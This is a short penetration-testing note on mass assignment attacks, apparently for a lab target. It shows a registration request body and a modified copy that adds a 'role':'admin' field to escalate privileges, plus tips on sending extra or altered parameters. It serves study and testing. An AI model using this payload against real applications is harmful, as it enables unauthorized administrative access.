# Mass Assignment Attack
- Try to manipulate data sent in the **HTTP** request.
	```json
	{
		"email":"cxnsxle2@cxnsxle2.com",
		"password":"cxnsxle123",
		"passwordRepeat":"cxnsxle123",
		"securityQuestion":{
			"id":2,
			"question":"Mother's maiden name?",
			"createdAt":"2023-08-23T23:41:35.950Z",
			"updatedAt":"2023-08-23T23:41:35.950Z"
		},
		"securityAnswer":"Cxnsxle"
	}
	```
	```json
	{
		"email":"cxnsxle2@cxnsxle2.com",
		"role":"admin",
		"password":"cxnsxle123",
		"passwordRepeat":"cxnsxle123",
		"securityQuestion":{
			"id":2,
			"question":"Mother's maiden name?",
			"createdAt":"2023-08-23T23:41:35.950Z",
			"updatedAt":"2023-08-23T23:41:35.950Z"
		},
		"securityAnswer":"Cxnsxle"
	}
	```
- Try sending more parameters than expected and analyze the response.
- Try manipulating the existing parameters than expected and analyze the response.